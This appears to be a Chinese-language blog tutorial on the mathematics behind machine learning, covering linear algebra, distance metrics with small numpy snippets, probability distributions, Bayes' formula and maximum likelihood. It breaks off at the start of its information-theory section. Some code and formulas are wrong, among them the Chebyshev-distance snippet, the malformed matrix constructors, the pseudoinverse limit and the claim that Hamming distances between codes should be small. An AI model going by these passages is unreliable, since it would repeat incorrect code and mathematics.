      <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><p>[TOC]</p><h1 id="机器学习：机器学习的数学基础"><a href="#机器学习：机器学习的数学基础" class="headerlink" title="机器学习：机器学习的数学基础"></a>机器学习：机器学习的数学基础</h1><h2 id="一、概述"><a href="#一、概述" class="headerlink" title="一、概述"></a>一、概述</h2><p>机器学习的特点就是：以计算机为工具和平台，以数据为研究对象，以学习方法为中心；<br>是概率论、线性代数、数值计算、信息论、最优化理论和计算机科学等多个领域的交叉学科。</p><h2 id="二、线性代数"><a href="#二、线性代数" class="headerlink" title="二、线性代数"></a>二、线性代数</h2><h3 id="2-1-标量"><a href="#2-1-标量" class="headerlink" title="2.1 标量"></a>2.1 标量</h3><p>一个标量就是一个单独的数，一般用小写的的变量名称表示。</p><h3 id="2-2-向量"><a href="#2-2-向量" class="headerlink" title="2.2 向量"></a>2.2 向量</h3><p>一个向量就是一列数，这些数是有序排列的。用过次序中的索引，我们可以确定每个单独的数。通常会赋予向量粗体的小写名称。当我们需要明确表示向量中的元素时，我们会将元素排列成一个方括号包围的纵柱：</p><script type="math/tex; mode=display">X=\begin{bmatrix}x_1\\x_2\\\vdots\\x_n\end{bmatrix}\quad</script><p>我们可以把向量看作空间中的点，每个元素是不同的坐标轴上的坐标。 </p><h3 id="2-3-矩阵"><a href="#2-3-矩阵" class="headerlink" title="2.3 矩阵"></a>2.3 矩阵</h3><p>矩阵是二维数组，其中的每一个元素被两个索引而非一个所确定。我们通常会赋予矩阵粗体的大写变量名称，比如$A$。如果一个实数矩阵高度为$m$，宽度为$n$，那么我们说$A\epsilon R^{m\times n}$。</p><script type="math/tex; mode=display">A=\begin{bmatrix}a_{11} & a_{12} & \dots & a_{1n}\\a_{21} & a_{22} & \dots & a_{2n}\\\vdots & \vdots &  & \dots\\a_{m1} & a_{m2} & \dots & a_{mn}\end{bmatrix}\quad</script><p>矩阵这东西在机器学习中就不要太重要了！实际上，如果我们现在有$N$个用户的数据，每条数据含有$M$个特征，那其实它对应的就是一个$N<em>M$的矩阵呀；再比如，一张图由$16</em>16$的像素点组成，那这就是一个$16*16$的矩阵了。</p><h3 id="2-4-张量"><a href="#2-4-张量" class="headerlink" title="2.4 张量"></a>2.4 张量</h3><p>几何代数中定义的张量是基于向量和矩阵的推广，通俗一点理解的话，我们可以将标量视为零阶张量，矢量视为一阶张量，那么矩阵就是二阶张量。</p><p>例如，可以将任意一张彩色图片表示成一个三阶张量，三个维度分别是图片的高度、宽度和色彩数据。将这张图用张量表示出来，就是最下方的那张表格：</p><p><img src="https://pic4.zhimg.com/v2-c0c16793d4662bfcdd7e112030096f94_r.jpg" alt=""></p><p>其中表的横轴表示图片的宽度值，这里只截取$0-319$；表的纵轴表示图片的高度值，这里只截取$0-4$；表格中每个方格代表一个像素点，比如第一行第一列的表格数据为$[1.0,1.0,1.0]$，代表的就是$RGB$三原色在图片的这个位置的取值情况（即$R=1.0$，$G=1.0$，$B=1.0$）。</p><p>当然我们还可以将这一定义继续扩展，即：我们可以用四阶张量表示一个包含多张图片的数据集，这四个维度分别是：图片在数据集中的编号，图片高度、宽度，以及色彩数据。</p><p>张量在深度学习中是一个很重要的概念，因为它是一个深度学习框架中的一个核心组件，后续的所有运算和优化算法几乎都是基于张量进行的。</p><h3 id="2-5-范数"><a href="#2-5-范数" class="headerlink" title="2-5 范数"></a>2-5 范数</h3><p>有时我们需要衡量一个向量的大小。在机器学习中，我们经常使用被称为范数$(norm)$的函数衡量矩阵大小。$L_p$范数如下：</p><script type="math/tex; mode=display">\left| \left| x \right| \right| _{p}^{} =\left( \sum_{i}^{}{\left| x_{i} \right| ^{p} } \right) _{}^{\frac{1}{p} }</script><p>所以：</p><p>$L_1$范数$ \left| \left| x \right| \right|$：为$x$向量各个元素绝对值之和；</p><p>$L<em>2$范数$ \left| \left| x \right| \right| </em>{2}$：为$x$向量各个元素平方和的开方。</p><p>这里先说明一下，在机器学习中，$ L_1$范数和$ L_2$范数很常见，主要用在损失函数中起到一个限制模型参数复杂度的作用，至于为什么要限制模型的复杂度，这又涉及到机器学习中常见的过拟合问题。具体的概念在后续文章中会有详细的说明和推导，大家先记住：这个东西很重要，实际中经常会涉及到，面试中也常会被问到！！！</p><h3 id="2-6-特征分解"><a href="#2-6-特征分解" class="headerlink" title="2.6 特征分解"></a>2.6 特征分解</h3><p>许多数学对象可以通过将它们分解成多个组成部分。特征分解是使用最广的矩阵分解之一，即将矩阵分解成一组特征向量和特征值。</p><p>方阵$ A$的特征向量是指与$ A$相乘后相当于对该向量进行缩放的非零向量$ \nu$ ：</p><script type="math/tex; mode=display">A\nu =\lambda \nu</script><p>标量$\lambda$被称为这个特征向量对应的特征值。 </p><p>使用特征分解去分析矩阵$ A$时，得到特征向量构成的矩阵$ V$和特征值构成的向量$\lambda$，我们可以重新将A写作：</p><script type="math/tex; mode=display">A=Vdiag\left( \lambda \right) V^{-1}</script><h3 id="2-7-奇异值分解（Singular-Value-Decomposition，SVD）"><a href="#2-7-奇异值分解（Singular-Value-Decomposition，SVD）" class="headerlink" title="2-7 奇异值分解（Singular Value Decomposition，SVD）"></a>2-7 奇异值分解（Singular Value Decomposition，SVD）</h3><p>矩阵的特征分解是有前提条件的，那就是只有对可对角化的矩阵才可以进行特征分解。但实际中很多矩阵往往不满足这一条件，甚至很多矩阵都不是方阵，就是说连矩阵行和列的数目都不相等。这时候怎么办呢？人们将矩阵的特征分解进行推广，得到了一种叫作“矩阵的奇异值分解”的方法，简称$ SVD$。通过奇异分解，我们会得到一些类似于特征分解的信息。</p><p>它的具体做法是将一个普通矩阵分解为奇异向量和奇异值。比如将矩阵$ A$分解成三个矩阵的乘积：</p><script type="math/tex; mode=display">A=UDV^{T}</script><p>假设<strong>$ A$是一个$m\times n$矩阵，那么$ U$是一个$m\times m$矩阵，$D$是一个$m\times n$矩阵，$V$是一个$n\times n$矩阵</strong>。</p><p>这些矩阵每一个都拥有特殊的结构，其中$U$和$V$都是正交矩阵，$D$是对角矩阵（注意，$D$不一定是方阵）。对角矩阵$D$对角线上的元素被称为矩阵$A$的奇异值。矩阵$U$的列向量被称为<strong>左奇异向量</strong>，矩阵$V$的列向量被称<strong>右奇异向量</strong>。</p><p>$SVD$最有用的一个性质可能是拓展矩阵求逆到非方矩阵上。另外，$SVD$可用于推荐系统中。</p><h3 id="2-8-Moore-Penrose伪逆"><a href="#2-8-Moore-Penrose伪逆" class="headerlink" title="2-8 Moore-Penrose伪逆"></a>2-8 Moore-Penrose伪逆</h3><p>对于非方矩阵而言，其逆矩阵没有定义。假设在下面问题中，我们想通过矩阵$A$的左逆$B$来求解线性方程：</p><script type="math/tex; mode=display">Ax=y</script><p>等式两边同时左乘左逆$B$后，得到：</p><script type="math/tex; mode=display">x=By</script><p>是否存在唯一的映射将$A$映射到$B$取决于问题的形式。</p><p>如果矩阵$A$的行数大于列数，那么上述方程可能没有解；如果矩阵$A$的行数小于列数，那么上述方程可能有多个解。</p><p>$Moore-Penrose$伪逆使我们能够解决这种情况，矩阵$A$的伪逆定义为：</p><script type="math/tex; mode=display">A^+=\lim_{a\rightarrow{0}}(A^T{A}+\alpha{I}^{-1})A^T</script><p>但是计算伪逆的实际算法没有基于这个式子，而是使用下面的公式：</p><script type="math/tex; mode=display">A^+=VD^+{U}^T</script><p>其中，矩阵$U$，$D$和$V$是矩阵$A$奇异值分解后得到的矩阵。对角矩阵$D$的伪逆$D^+$是其非零元素取倒之后再转置得到的。</p><h3 id="2-9-几种常用的距离"><a href="#2-9-几种常用的距离" class="headerlink" title="2-9 几种常用的距离"></a>2-9 几种常用的距离</h3><p>上面大致说过， 在机器学习里，我们的运算一般都是基于向量的，一条用户具有$100$个特征，那么他对应的就是一个$100$维的向量，通过计算两个用户对应向量之间的距离值大小，有时候能反映出这两个用户的相似程度。这在后面的$KNN$算法和$K-means$算法中很明显。</p><p>设有两个$n$维变量$A=\left[ x<em>{11}, x</em>{12},…,x<em>{1n} \right]$和$B=\left[ x</em>{21} ,x<em>{22} ,…,x</em>{2n} \right]$，则一些常用的距离公式定义如下：</p><h4 id="1、曼哈顿距离"><a href="#1、曼哈顿距离" class="headerlink" title="1、曼哈顿距离"></a>1、曼哈顿距离</h4><p>曼哈顿距离也称为城市街区距离，数学定义如下：</p><script type="math/tex; mode=display">d_{12} =\sum_{k=1}^{n}{\left| x_{1k}-x_{2k} \right| }</script><p>曼哈顿距离的$Python$实现：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> numpy <span class="keyword">import</span> *  </span><br><span class="line">vector1 = mat([<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>])  </span><br><span class="line">vector2 = mat([<span class="number">4</span>,<span class="number">5</span>,<span class="number">6</span>])  </span><br><span class="line"><span class="keyword">print</span> sum(abs(vector1-vector2))</span><br></pre></td></tr></table></figure><h4 id="2、欧氏距离"><a href="#2、欧氏距离" class="headerlink" title="2、欧氏距离"></a>2、欧氏距离</h4><p>欧氏距离其实就是$L_2$范数，数学定义如下： </p><script type="math/tex; mode=display">d_{12} =\sqrt{\sum_{k=1}^{n}{\left( x_{1k} -x_{2k} \right) ^{2} } }</script><p>欧氏距离的$Python$实现：<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> numpy <span class="keyword">import</span> *</span><br><span class="line">vector1 = mat([<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>])</span><br><span class="line">vector2 = mat([<span class="number">4</span>,<span class="number">5</span>,<span class="number">6</span>])</span><br><span class="line"><span class="keyword">print</span> sqrt((vector1-vector2)*(vector1-vector2).T)</span><br></pre></td></tr></table></figure></p><h4 id="3、闵可夫斯基距离"><a href="#3、闵可夫斯基距离" class="headerlink" title="3、闵可夫斯基距离"></a>3、闵可夫斯基距离</h4><p>从严格意义上讲，闵可夫斯基距离不是一种距离，而是一组距离的定义：</p><script type="math/tex; mode=display">d_{12} =\sqrt[p]{\sum_{k=1}^{n}{\left( x_{1k} -x_{2k} \right) ^{p} } }</script><p>实际上，当$p=1$时，就是曼哈顿距离；当$p=2$时，就是欧式距离。</p><h4 id="4、切比雪夫距离"><a href="#4、切比雪夫距离" class="headerlink" title="4、切比雪夫距离"></a>4、切比雪夫距离</h4><p>切比雪夫距离就是$L_{\varpi}$，即无穷范数，数学表达式如下：</p><script type="math/tex; mode=display">d_{12} =max\left( \left| x_{1k}-x_{2k} \right| \right)</script><p>切比雪夫距离额Python实现如下：<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> numpy <span class="keyword">import</span> *</span><br><span class="line">vector1 = mat([<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>])</span><br><span class="line">vector2 = mat([<span class="number">4</span>,<span class="number">5</span>,<span class="number">6</span>])</span><br><span class="line"><span class="keyword">print</span> sqrt(abs(vector1-vector2).max)</span><br></pre></td></tr></table></figure></p><h4 id="5、夹角余弦"><a href="#5、夹角余弦" class="headerlink" title="5、夹角余弦"></a>5、夹角余弦</h4><p>夹角余弦的取值范围为$[-1,1]$，可以用来衡量两个向量方向的差异；夹角余弦越大，表示两个向量的夹角越小；当两个向量的方向重合时，夹角余弦取最大值$1$；当两个向量的方向完全相反时，夹角余弦取最小值$-1$。</p><p>机器学习中用这一概念来衡量样本向量之间的差异，其数学表达式如下：</p><script type="math/tex; mode=display">cos\theta =\frac{AB}{\left| A \right| \left|B \right| } =\frac{\sum_{k=1}^{n}{x_{1k}x_{2k} } }{\sqrt{\sum_{k=1}^{n}{x_{1k}^{2} } } \sqrt{\sum_{k=1}^{n}{x_{2k}^{2} } } }</script><p>夹角余弦的Python实现：<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> numpy <span class="keyword">import</span> *</span><br><span class="line">vector1 = mat([<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>])</span><br><span class="line">vector2 = mat([<span class="number">4</span>,<span class="number">5</span>,<span class="number">6</span>])</span><br><span class="line"><span class="keyword">print</span> dot(vector1,vector2)/(linalg.norm(vector1)*linalg.norm(vector2))</span><br></pre></td></tr></table></figure></p><h4 id="6、汉明距离"><a href="#6、汉明距离" class="headerlink" title="6、汉明距离"></a>6、汉明距离</h4><p>汉明距离定义的是两个字符串中不相同位数的数目。</p><p>例如：字符串$’1111’$与$’1001’$之间的汉明距离为$2$。</p><p>信息编码中一般应使得编码间的汉明距离尽可能的小。</p><p>汉明距离的Python实现：<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> numpy <span class="keyword">import</span> *</span><br><span class="line">matV = mat([<span class="number">1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">1</span>],[<span class="number">1</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">1</span>])</span><br><span class="line">smstr = nonzero(matV[<span class="number">0</span>]-matV[<span class="number">1</span>])</span><br><span class="line"><span class="keyword">print</span> smstr</span><br></pre></td></tr></table></figure></p><h4 id="7、杰卡德相似系数"><a href="#7、杰卡德相似系数" class="headerlink" title="7、杰卡德相似系数"></a>7、杰卡德相似系数</h4><p>两个集合A和B的交集元素在A和B的并集中所占的比例称为两个集合的杰卡德相似系数，用符号$J(A,B)$表示，数学表达式为：</p><script type="math/tex; mode=display">J\left( A,B \right) =\frac{\left| A\cap B\right| }{\left|A\cup B \right| }</script><p>杰卡德相似系数是衡量两个集合的相似度的一种指标。一般可以将其用在衡量样本的相似度上。</p><h4 id="8、杰卡德距离"><a href="#8、杰卡德距离" class="headerlink" title="8、杰卡德距离"></a>8、杰卡德距离</h4><p>与杰卡德相似系数相反的概念是杰卡德距离，其定义式为：</p><script type="math/tex; mode=display">J_{\sigma} =1-J\left( A,B \right) =\frac{\left| A\cup B \right| -\left| A\cap B \right| }{\left| A\cup B \right| }</script><p>杰卡德距离的Python实现：<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> numpy <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> scipy.spatial.distance <span class="keyword">as</span> dist</span><br><span class="line">matV = mat([<span class="number">1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">1</span>],[<span class="number">1</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">1</span>])</span><br><span class="line"><span class="keyword">print</span> dist.pdist(matV,<span class="string">'jaccard'</span>)</span><br></pre></td></tr></table></figure></p><h2 id="三、概率"><a href="#三、概率" class="headerlink" title="三、概率"></a>三、概率</h2><h3 id="3-1-为什么使用概率？"><a href="#3-1-为什么使用概率？" class="headerlink" title="3.1 为什么使用概率？"></a>3.1 为什么使用概率？</h3><p>概率论是用于表示不确定性陈述的数学框架，即它是对事物不确定性的度量。</p><p>在人工智能领域，我们主要以两种方式来使用概率论。首先，概率法则告诉我们AI系统应该如何推理，所以我们设计一些算法来计算或者近似由概率论导出的表达式。其次，我们可以用概率和统计从理论上分析我们提出的AI系统的行为。</p><p>计算机科学的许多分支处理的对象都是完全确定的实体，但机器学习却大量使用概率论。实际上如果你了解机器学习的工作原理你就会觉得这个很正常。因为机器学习大部分时候处理的都是不确定量或随机量。</p><h4 id="3-2-随机变量"><a href="#3-2-随机变量" class="headerlink" title="3.2 随机变量"></a>3.2 随机变量</h4><p>随机变量可以随机地取不同值的变量。我们通常用小写字母来表示随机变量本身，而用带数字下标的小写字母来表示随机变量能够取到的值。例如，x<em>{1}  和x</em>{2}  都是随机变量X可能的取值。</p><p>对于向量值变量，我们会将随机变量写成X，它的一个值为x。就其本身而言，一个随机变量只是对可能的状态的描述；它必须伴随着一个概率分布来指定每个状态的可能性。</p><p>随机变量可以是离散的或者连续的。</p><h4 id="3-3-概率分布"><a href="#3-3-概率分布" class="headerlink" title="3.3 概率分布"></a>3.3 概率分布</h4><p>给定某随机变量的取值范围，概率分布就是导致该随机事件出现的可能性。</p><p>从机器学习的角度来看，概率分布就是符合随机变量取值范围的某个对象属于某个类别或服从某种趋势的可能性。</p><h4 id="3-4-条件概率"><a href="#3-4-条件概率" class="headerlink" title="3.4 条件概率"></a>3.4 条件概率</h4><p>很多情况下，我们感兴趣的是某个事件在给定其它事件发生时出现的概率，这种概率叫条件概率。</p><p>我们将给定$X=x$时$Y=y$发生的概率记为$P\left( Y=y|X=x \right)$，这个概率可以通过下面的公式来计算：</p><script type="math/tex; mode=display">P\left( Y=y|X=x \right) =\frac{P\left( Y=y,X=x \right) }{P\left( X=x \right) }</script><h4 id="3-5-贝叶斯公式"><a href="#3-5-贝叶斯公式" class="headerlink" title="3.5 贝叶斯公式"></a>3.5 贝叶斯公式</h4><p>先看看什么是“先验概率”和“后验概率”，以一个例子来说明：</p><p>假设某种病在人群中的发病率是$0.001$，即$1000$人中大概会有$1$个人得病，则有：$P(患病) = 0.1\%$；即：在没有做检验之前，我们预计的患病率为$P(患病)=0.1\%$，这个就叫作”先验概率”。 </p><p>再假设现在有一种该病的检测方法，其检测的准确率为$95\%$；即：如果真的得了这种病，该检测法有$95\%$的概率会检测出阳性，但也有5%的概率检测出阴性；或者反过来说，但如果没有得病，采用该方法有$95\%$的概率检测出阴性，但也有$5\%$的概率检测为阳性。用概率条件概率表示即为：$P(显示阳性|患病)=95\%$。</p><p>现在我们想知道的是：在做完检测显示为阳性后，某人的患病率$P(患病|显示阳性)$，这个其实就称为”后验概率”。</p><p>而这个叫贝叶斯的人其实就是为我们提供了一种可以利用先验概率计算后验概率的方法，我们将其称为“贝叶斯公式”。</p><p>这里先了解<strong>条件概率公式</strong>：</p><script type="math/tex; mode=display">P\left( B|A \right)=\frac{P\left( AB \right)}{P\left( A \right)} , P\left( A|B \right)=\frac{P\left( AB \right)}{P\left( B \right)}</script><p>由条件概率可以得到<strong>乘法公式</strong>：  </p><script type="math/tex; mode=display">P\left( AB \right)=P\left( B|A \right)P\left( A \right)=P\left( A|B \right)P\left( B \right)</script><p>将条件概率公式和乘法公式结合可以得到：</p><script type="math/tex; mode=display">P\left( B|A \right)=\frac{P\left( A|B \right)\cdot P\left( B \right)}{P\left( A \right)}</script><p>再由<strong>全概率公式</strong>：</p><script type="math/tex; mode=display">P\left( A \right)=\sum_{i=1}^{N}{P\left( A|B_{i} \right) \cdot P\left( B_{i}\right)}</script><p>代入可以得到<strong>贝叶斯公式</strong>：</p><script type="math/tex; mode=display">P\left( B_{i}|A \right)=\frac{P\left( A|B_{i} \right)\cdot P\left( B_{i} \right)}{\sum_{i=1}^{N}{P\left( A|B_{i} \right) \cdot P\left( B_{i}\right)} }</script><p>在这个例子里就是：</p><script type="math/tex; mode=display">\begin{aligned} % requires amsmath; align* for no eq. numberp(患病|显示阳性) & =\frac{P(显示阳性|患病)P(患病)}{P(显示阳性)}\\                & =\frac{P(显示阳性|患病)P(患病)}{P(显示阳性|患病)P(患病)+{P(显示阳性|无病)P(无病)}}\\                & =\frac{95\%*0.1\%}{95\%*0.1\%+5\%*99.9\%}=1.86\%\end{aligned}</script><p>贝叶斯公式贯穿了机器学习中随机问题分析的全过程。从文本分类到概率图模型，其基本分类都是贝叶斯公式。</p><p>期望、方差、协方差等主要反映数据的统计特征，机器学习的一个很大应用就是数据挖掘等，因此这些基本的统计概念也是很有必要掌握。另外，像后面的EM算法中，就需要用到期望的相关概念和性质。</p><h4 id="3-6-期望"><a href="#3-6-期望" class="headerlink" title="3.6 期望"></a>3.6 期望</h4><p>在概率论和统计学中，数学期望是试验中每次可能结果的概率乘以其结果的总和。它是最基本的数学特征之一，反映随机变量平均值的大小。</p><p>假设X是一个离散随机变量，其可能的取值有：$\left\{ x<em>{1} ,x</em>{2} ,……,x<em>{n} \right\}$，各个取值对应的概率取值为：$P\left( x</em>{k} \right) , k=1,2,……,n$，则其数学期望被定义为：</p><script type="math/tex; mode=display">E\left(X \right) =\sum_{k=1}^{n}{x_{k} P\left( x_{k} \right) }</script><p>假设$X$是一个连续型随机变量，其概率密度函数为$P\left( x \right)$则其数学期望被定义为：</p><script type="math/tex; mode=display">E\left( x \right) =\int_{-\varpi }^{+\varpi } xf\left( x \right) dx</script><h4 id="3-7-方差"><a href="#3-7-方差" class="headerlink" title="3.7 方差"></a>3.7 方差</h4><p>概率中，方差用来衡量随机变量与其数学期望之间的偏离程度；统计中的方差为样本方差，是各个样本数据分别与其平均数之差的平方和的平均数。数学表达式如下： </p><script type="math/tex; mode=display">Var\left( x \right) =E\left\{ \left[ x-E\left( x \right) \right] ^{2} \right\} =E\left( x^{2} \right) -\left[ E\left( x \right) \right] ^{2}</script><h4 id="3-8-协方差"><a href="#3-8-协方差" class="headerlink" title="3.8 协方差"></a>3.8 协方差</h4><p>在概率论和统计学中，协方差被用于衡量两个随机变量$X$和$Y$之间的总体误差。数学定义式为：</p><script type="math/tex; mode=display">Cov\left( X,Y \right) =E\left[ \left( X-E\left[ X \right] \right) \left( Y-E\left[ Y \right] \right) \right] =E\left[ XY \right] -E\left[ X \right] E\left[ Y \right]</script><h4 id="3-9-常见分布函数"><a href="#3-9-常见分布函数" class="headerlink" title="3.9 常见分布函数"></a>3.9 常见分布函数</h4><h4 id="1）0-1分布"><a href="#1）0-1分布" class="headerlink" title="1）0-1分布"></a>1）0-1分布</h4><p>$0-1$分布是单个二值型离散随机变量的分布，其概率分布函数为：  </p><script type="math/tex; mode=display">P\left( X=1 \right) =pP\left( X=0 \right) =1-p</script><h4 id="2）几何分布"><a href="#2）几何分布" class="headerlink" title="2）几何分布"></a>2）几何分布</h4><p>几何分布是离散型概率分布，其定义为：在n次伯努利试验中，试验k次才得到第一次成功的机率。即：前$k-1$次皆失败，第k次成功的概率。其概率分布函数为：</p><script type="math/tex; mode=display">P\left( X=k \right) =\left( 1-p \right) ^{k-1} p</script><p>性质：</p><script type="math/tex; mode=display">E\left( X \right) =\frac{1}{p} Var\left( X \right) =\frac{1-p}{p^{2} }</script><h4 id="3）二项分布"><a href="#3）二项分布" class="headerlink" title="3）二项分布"></a>3）二项分布</h4><p>二项分布即重复n次伯努利试验，各次试验之间都相互独立，并且每次试验中只有两种可能的结果，而且这两种结果发生与否相互对立。如果每次试验时，事件发生的概率为p，不发生的概率为1-p，则n次重复独立试验中发生k次的概率为：   </p><script type="math/tex; mode=display">P\left( X=k \right) =C_{n}^{k} p^{k} \left( 1-p \right) ^{n-k}</script><p>性质：   </p><script type="math/tex; mode=display">E\left( X \right) =npVar\left( X \right) =np\left( 1-p \right)</script><h4 id="4）高斯分布"><a href="#4）高斯分布" class="headerlink" title="4）高斯分布"></a>4）高斯分布</h4><p>高斯分布又叫正态分布，其曲线呈钟型，两头低，中间高，左右对称因其曲线呈钟形，如下图所示：(A这里少高斯分布图像)</p><p><img src="https://pic4.zhimg.com/80/v2-a0811acc8ab121a3ad8f2e37ff6c37cc_hd.jpg" alt=""></p><p>若随机变量$X$服从一个数学期望为$\mu$，方差为$\sigma ^{2}$的正态分布，则我们将其记为：$N\left( \mu ,\sigma^{2} \right)$。其期望值$\mu$决定了正态分布的位置，其标准差$\sigma$（方差的开方）决定了正态分布的幅度。</p><h4 id="5）指数分布"><a href="#5）指数分布" class="headerlink" title="5）指数分布"></a>5）指数分布</h4><p>指数分布是事件的时间间隔的概率，它的一个重要特征是无记忆性。例如：如果某一元件的寿命的寿命为T，已知元件使用了$t$小时，它总共使用至少$t+s$小时的条件概率，与从开始使用时算起它使用至少$s$小时的概率相等。下面这些都属于指数分布：</p><ul><li>婴儿出生的时间间隔</li><li>网站访问的时间间隔</li><li>奶粉销售的时间间隔    </li></ul><p>指数分布的公式可以从泊松分布推断出来。如果下一个婴儿要间隔时间$t$，就等同于$t$之内没有任何婴儿出生，即：   </p><script type="math/tex; mode=display">P\left( X\geq t \right) =P\left( N\left( t \right) =0 \right) =\frac{\left( \lambda t \right) ^{0}\cdot e^{-\lambda t} }{0!}=e^{-\lambda t}</script><p>则：   </p><script type="math/tex; mode=display">P\left( X\leq t \right) =1-P\left( X\geq t \right) =1-e^{-\lambda t}</script><p>如：接下来15分钟，会有婴儿出生的概率为：</p><script type="math/tex; mode=display">P\left( X\leq \frac{1}{4} \right) =1-e^{-3\cdot \frac{1}{4} } \approx 0.53</script><p>指数分布的图像如下：</p><p><img src="https://pic4.zhimg.com/80/v2-a58c37c481e032bbb53ff17113754ef6_hd.jpg" alt="tu"></p><h4 id="6）泊松分布"><a href="#6）泊松分布" class="headerlink" title="6）泊松分布"></a>6）泊松分布</h4><p>日常生活中，大量事件是有固定频率的，比如：</p><p>某医院平均每小时出生3个婴儿<br>某网站平均每分钟有2次访问<br>某超市平均每小时销售4包奶粉<br>它们的特点就是，我们可以预估这些事件的总数，但是没法知道具体的发生时间。已知平均每小时出生3个婴儿，请问下一个小时，会出生几个？有可能一下子出生6个，也有可能一个都不出生，这是我们没法知道的。</p><p>泊松分布就是描述某段时间内，事件具体的发生概率。其概率函数为：   </p><script type="math/tex; mode=display">P\left( N\left( t \right) =n \right) =\frac{\left( \lambda t \right) ^{n}e^{-\lambda t} }{n!}</script><p>其中：</p><p>$P$表示概率，$N$表示某种函数关系，$t$表示时间，$n$表示数量，1小时内出生3个婴儿的概率，就表示为$P(N(1) = 3)$；$λ$表示事件的频率。</p><p>还是以上面医院平均每小时出生3个婴儿为例，则$\lambda =3$；</p><p>那么，接下来两个小时，一个婴儿都不出生的概率可以求得为：   </p><script type="math/tex; mode=display">P\left( N\left(2 \right) =0 \right) =\frac{\left( 3\cdot 2 \right) ^{o} \cdot e^{-3\cdot 2} }{0!} \approx 0.0025</script><p>同理，我们可以求接下来一个小时，至少出生两个婴儿的概率：    </p><script type="math/tex; mode=display">P\left( N\left( 1 \right) \geq 2 \right) =1-P\left( N\left( 1 \right)=0 \right) - P\left( N\left( 1 \right)=1 \right)\approx 0.8</script><p>【注】上面的指数分布和泊松分布参考了阮一峰大牛的博客：“泊松分布和指数分布：10分钟教程”，在此说明，也对其表示感谢！</p><h4 id="3-10-Lagrange乘子法"><a href="#3-10-Lagrange乘子法" class="headerlink" title="3.10 Lagrange乘子法"></a>3.10 Lagrange乘子法</h4><p>对于一般的求极值问题我们都知道，求导等于0就可以了。但是如果我们不但要求极值，还要求一个满足一定约束条件的极值，那么此时就可以构造Lagrange函数，其实就是把约束项添加到原函数上，然后对构造的新函数求导。</p><p>对于一个要求极值的函数$f\left( x,y \right)$，图上的蓝圈就是这个函数的等高图，就是说$f\left( x,y \right) =c<em>{1} ,c</em>{2} ,…,c<em>{n}$分别代表不同的数值(每个值代表一圈，等高图)，我要找到一组$\left( x,y \right)$，使它的$c</em>{i}$值越大越好，但是这点必须满足约束条件$g\left( x,y \right)$（在黄线上）。</p><p><img src="https://pic1.zhimg.com/80/v2-e59fd8c296c7e8c3b804726998610b31_hd.jpg" alt="tu1" title="tu1"></p><p>也就是说$f(x,y)$和$g(x,y)$相切，或者说它们的梯度$\nabla{f}$和$\nabla{g}$平行，因此它们的梯度（偏导）成倍数关系；那我么就假设为$\lambda $倍，然后把约束条件加到原函数后再对它求导，其实就等于满足了下图上的式子。</p><p>在支持向量机模型（SVM）的推导中一步很关键的就是利用拉格朗日对偶性将原问题转化为对偶问题。</p><h4 id="3-11、最大似然估计"><a href="#3-11、最大似然估计" class="headerlink" title="3-11、最大似然估计"></a>3-11、最大似然估计</h4><p>最大似然也称为最大概似估计，即：在“模型已定，参数$θ$未知”的情况下，通过观测数据估计未知参数θ 的一种思想或方法。</p><p><strong>其基本思想是</strong>：  给定样本取值后，该样本最有可能来自参数$\theta$为何值的总体。即：寻找$\tilde{\theta } _{ML}$使得观测到样本数据的可能性最大。</p><p>举个例子，假设我们要统计全国人口的身高，首先假设这个身高服从服从正态分布，但是该分布的均值与方差未知。由于没有足够的人力和物力去统计全国每个人的身高，但是可以通过采样（所有的采样要求都是独立同分布的），获取部分人的身高，然后通过最大似然估计来获取上述假设中的正态分布的均值与方差。</p><p>求极大似然函数估计值的一般步骤：</p><ol><li>写出似然函数； <script type="math/tex; mode=display">L(\theta_1,\theta_2,\dots,\theta_n)=\left \{\begin{array}{c}\prod_{i=1}^{n}p(x_i;\theta_1,\theta_2,\dots,\theta_n)\\\prod_{i=1}^{n}f(x_i;\theta_1,\theta_2,\dots,\theta_n)\end{array}\right.</script></li><li>对似然函数取对数；  </li><li>两边同时求导数；  </li><li>令导数为0解出似然方程。  </li></ol><p>在机器学习中也会经常见到极大似然的影子。比如后面的<strong>逻辑斯特回归模型（LR）</strong>，其核心就是构造对数损失函数后运用极大似然估计。</p><h3 id="四、信息论"><a href="#四、信息论" class="headerlink" title="四、信息论"></a>四、信息论</h3><p>信息论本来是通信中的概念，但是其核心思想“熵”在机器学习中也得到了广泛的应用。比如决策树模型$ID3$，$C4.5$中是利用<strong>信息增益</strong>来划分特征而生成一颗决策树的，而信息增益就是基于这里所说的<strong>熵</strong>。所以它的重要性也是可想而知。</p><h4 id="4-1-熵"><a href="#4-1-熵" class="headerlink" title="4.1 